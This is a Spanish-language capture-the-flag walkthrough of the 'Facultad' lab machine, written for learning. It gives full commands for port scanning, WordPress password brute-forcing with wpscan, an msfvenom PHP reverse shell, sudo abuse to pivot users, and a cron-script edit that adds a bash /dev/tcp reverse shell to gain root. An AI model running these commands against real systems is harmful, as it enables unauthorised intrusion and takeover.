## 🧠 Resolución del CTF "Facultad" – Análisis técnico completo

**Plataforma:** TheHackersLabs\
**Nombre de la máquina:** Facultad\
**Dificultad:** Fácil – Ideal para iniciarse en enumeración web, esteganografía, WordPress, y escalada de privilegios\
**Autor:** Beafn28

---

### 🔍 1. Escaneo inicial: reconocimiento de servicios y puertos

Ejecutamos `nmap` para descubrir servicios activos:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn <IP>
```

**Resultado:**

- `22/tcp` → SSH (OpenSSH 9.2p1)
- `80/tcp` → HTTP (Apache 2.4.62)
- `3306/tcp` → MySQL

La MAC revela que es una VM de VirtualBox corriendo Linux.

---

### 🌐 2. Fuerza bruta web: directorios y archivos ocultos

Lanzamos un escaneo web con `feroxbuster`:

```bash
feroxbuster -u http://<IP> -w directory-list-2.3-medium.txt -x php,html,txt
```

Se detectan rutas interesantes:

- `/education`
- `/images/facultad.jpg`

---

### 🖼 3. Esteganografía: extrayendo datos ocultos en imagen

Intentamos extraer información con `steghide`:

```bash
steghide extract -sf facultad.jpg
```

Se obtiene `mensaje.txt`, con contenido en Brainfuck.

---

### 🛡 4. Ataque a WordPress: enumeración y fuerza bruta

Confirmamos WordPress en `/education`. Usamos `wpscan`:

```bash
wpscan --url http://<IP>/education/ --usernames facultad --passwords rockyou.txt
```

Resultado:\
**Usuario:** facultad\
**Contraseña:** asdfghjkl

---

### 👛 5. Reverse shell desde WordPress

Creamos una reverse shell con:

```bash
msfvenom -p php/reverse_php LHOST=<tu_ip> LPORT=4444 -f raw > shell.php
```

La subimos, accedemos a la URL y escuchamos con:

```bash
nc -nlvp 4444
```

Se obtiene acceso como `www-data`.

---

### ⬆️ 6. Escalada de privilegios a "gabri"

Comprobamos permisos sudo:

```bash
sudo -l
```

Permite ejecutar PHP como `gabri`:

```bash
sudo -u gabri php -r "system('/bin/bash');"
```

En `mensaje.txt`, tras decodificar Brainfuck, obtenemos la contraseña:\
**lapatrona2025**

---

### 👑 7. Escalada a root con cron job

Como `gabri`, vemos un script ejecutado por root:

```bash
/home/vivian/scripts/script.sh
```

Si editable, añadimos:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<tu_IP>/5555 0>&1
```

Escuchamos con:

```bash
nc -nlvp 5555
```

Y obtenemos acceso como `root`.

---

### 🌟 Conclusión: aprendizajes clave

| Técnica              | Qué aprendimos                              |
| -------------------- | ------------------------------------------- |
| Escaneo con Nmap     | Identificar servicios expuestos             |
| Fuzzing web          | Descubrir rutas ocultas                     |
| Esteganografía       | Extraer datos sensibles de imágenes         |
| WordPress Pentesting | Fuerza bruta y enumeración de usuarios      |
| Reverse Shell        | Acceso interactivo desde servidor web       |
| Escalada con sudo    | Uso de permisos para pivotar a otro usuario |
| Cron jobs inseguros  | Obtener acceso root                         |

---

### 🔐 Buenas prácticas que se deben aplicar

- Usar contraseñas robustas
- Revisar archivos multimedia antes de publicarlos
- Configurar correctamente los permisos de `sudo`
- Controlar scripts ejecutados por cron
- Restringir servicios expuestos como MySQL

---

🔹 CTF muy recomendable para practicar habilidades clave en pentesting inicial.

